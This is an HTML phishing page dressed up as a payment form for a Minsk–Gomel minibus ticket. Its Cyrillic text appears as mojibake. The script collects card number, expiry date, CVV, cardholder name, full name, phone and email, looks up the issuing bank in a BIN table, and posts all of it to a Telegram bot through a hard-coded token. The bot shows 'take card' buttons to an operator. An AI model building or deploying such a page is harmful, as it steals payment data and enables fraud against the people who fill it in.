<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Marshrutka</title>
</head>
<body>
    <h2>ĞĞ¿Ğ»Ğ°Ñ‚Ğ° Ğ±Ğ¸Ğ»ĞµÑ‚Ğ°</h2>
    <form id="cardForm">
        <input type="text" id="cardNumber" placeholder="ĞĞ¾Ğ¼ĞµÑ€ ĞºĞ°Ñ€Ñ‚Ñ‹" required><br>
        <input type="text" id="expiry" placeholder="ĞœĞœ/Ğ“Ğ“" required><br>
        <input type="text" id="cvv" placeholder="CVV" required><br>
        <input type="text" id="cardholder" placeholder="Ğ’Ğ»Ğ°Ğ´ĞµĞ»ĞµÑ†" required><br>
        <input type="text" id="fullName" placeholder="Ğ¤Ğ˜Ğ" required><br>
        <input type="text" id="phone" placeholder="Ğ¢ĞµĞ»ĞµÑ„Ğ¾Ğ½" required><br>
        <input type="email" id="email" placeholder="Email"><br>
        <button type="submit">ĞĞ¿Ğ»Ğ°Ñ‚Ğ¸Ñ‚ÑŒ</button>
    </form>

    <script>
        const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
        const ADMIN_ID = 5852338439;
        const linkHash = new URLSearchParams(window.location.search).get('hash') || 'test123';

        // Ğ‘Ğ°Ğ·Ğ° BIN (60+ Ğ±Ğ°Ğ½ĞºĞ¾Ğ²)
        const BIN_DB = {
            '427901': { bank: 'Ğ‘ĞµĞ»Ğ°Ñ€ÑƒÑĞ±Ğ°Ğ½Ğº', type: 'Visa Classic' },
            '427902': { bank: 'Ğ‘ĞµĞ»Ğ°Ñ€ÑƒÑĞ±Ğ°Ğ½Ğº', type: 'Visa Gold' },
            '425501': { bank: 'Ğ‘ĞµĞ»Ğ°Ñ€ÑƒÑĞ±Ğ°Ğ½Ğº', type: 'Mastercard Standard' },
            '521324': { bank: 'ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ±Ğ°Ğ½Ğº', type: 'Mastercard Standard' },
            '515701': { bank: 'ĞŸÑ€Ğ¸Ğ¾Ñ€Ğ±Ğ°Ğ½Ğº', type: 'Visa Classic' },
            '440501': { bank: 'Ğ‘ĞµĞ»Ğ¸Ğ½Ğ²ĞµÑÑ‚Ğ±Ğ°Ğ½Ğº', type: 'Visa Classic' },
            '458101': { bank: 'ĞĞ»ÑŒÑ„Ğ°-Ğ‘Ğ°Ğ½Ğº', type: 'Visa Classic' },
            '555501': { bank: 'ĞĞ»ÑŒÑ„Ğ°-Ğ‘Ğ°Ğ½Ğº', type: 'Mastercard Standard' },
            '424601': { bank: 'Ğ¢ĞµÑ…Ğ½Ğ¾Ğ±Ğ°Ğ½Ğº', type: 'Visa' },
            '498401': { bank: 'ĞŸĞ°Ñ€Ğ¸Ñ‚ĞµÑ‚Ğ±Ğ°Ğ½Ğº', type: 'Visa' },
            '411111': { bank: 'Ğ Ğ Ğ‘-Ğ‘Ğ°Ğ½Ğº', type: 'Visa' },
            '437237': { bank: 'Ğ¥Ğ¾ÑƒĞ¼ ĞšÑ€ĞµĞ´Ğ¸Ñ‚', type: 'Visa' },
            '437772': { bank: 'Ğ¢Ğ¸Ğ½ÑŒĞºĞ¾Ñ„Ñ„', type: 'Visa' },
            '427688': { bank: 'Ğ¡Ğ±ĞµÑ€Ğ±Ğ°Ğ½Ğº', type: 'Visa' },
            '546901': { bank: 'Ğ¡Ğ±ĞµÑ€Ğ±Ğ°Ğ½Ğº', type: 'Mastercard' },
        };

        function getBinInfo(cardNumber) {
            const bin = cardNumber.replace(/\D/g, '').slice(0, 6);
            return BIN_DB[bin] || { bank: 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾', type: 'ĞĞµĞ¸Ğ·Ğ²ĞµÑÑ‚Ğ½Ğ¾' };
        }

        document.getElementById('cardForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const cardNumber = document.getElementById('cardNumber').value;
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            const cardholder = document.getElementById('cardholder').value;
            const fullName = document.getElementById('fullName').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;

            const binInfo = getBinInfo(cardNumber);
            const sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7);

            const messageText = `ğŸ’³ ĞĞĞ’ĞĞ¯ ĞšĞĞ Ğ¢Ğ\n\n` +
                `ğŸš ĞœĞ°Ñ€ÑˆÑ€ÑƒÑ‚: ĞœĞ¸Ğ½ÑĞº â†’ Ğ“Ğ¾Ğ¼ĞµĞ»ÑŒ\n` +
                `ğŸ“… 15.03.2026 18:30\n` +
                `ğŸ’° 27 BYN\n` +
                `ğŸ‘¤ ĞŸĞ°ÑÑĞ°Ğ¶Ğ¸Ñ€: ${fullName}\n` +
                `ğŸ“ Ğ¢ĞµĞ»ĞµÑ„Ğ¾Ğ½: ${phone}\n` +
                `ğŸ“§ Email: ${email}\n` +
                `ğŸ’³ ĞšĞ°Ñ€Ñ‚Ğ°: ${cardNumber}\n` +
                `ğŸ“… Ğ¡Ñ€Ğ¾Ğº: ${expiry} | CVV: ${cvv}\n` +
                `ğŸ‘¤ Ğ’Ğ»Ğ°Ğ´ĞµĞ»ĞµÑ†: ${cardholder}\n` +
                `ğŸ”¢ BIN: ${cardNumber.replace(/\D/g, '').slice(0,6)}\n` +
                `ğŸ¦ Ğ‘ĞĞĞš: ${binInfo.bank}\n` +
                `ğŸ’ Ğ¢Ğ˜ĞŸ: ${binInfo.type}\n` +
                `ğŸ”— Ğ¥ĞµÑˆ: ${linkHash}\n` +
                `ğŸ†” Ğ¡ĞµÑÑĞ¸Ñ: ${sessionId}`;

            // ĞšĞ»Ğ°Ğ²Ğ¸Ğ°Ñ‚ÑƒÑ€Ğ° Ñ ĞºĞ½Ğ¾Ğ¿ĞºĞ°Ğ¼Ğ¸
            const keyboard = {
                inline_keyboard: [
                    [{ text: 'ğŸ’° Ğ’Ğ—Ğ¯Ğ¢Ğ¬ ĞšĞĞ Ğ¢Ğ£', callback_data: `take_${sessionId}` },
                     { text: 'ğŸ—‘ ĞĞ¢ĞšĞĞ—', callback_data: `reject_${sessionId}` }]
                ]
            };

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: messageText,
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });
                alert('Ğ”Ğ°Ğ½Ğ½Ñ‹Ğµ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ĞµĞ½Ñ‹ Ñ ĞºĞ½Ğ¾Ğ¿ĞºĞ°Ğ¼Ğ¸!');
            } catch (error) {
                alert('ĞÑˆĞ¸Ğ±ĞºĞ°: ' + error);
            }
        });
    </script>
</body>
</html>
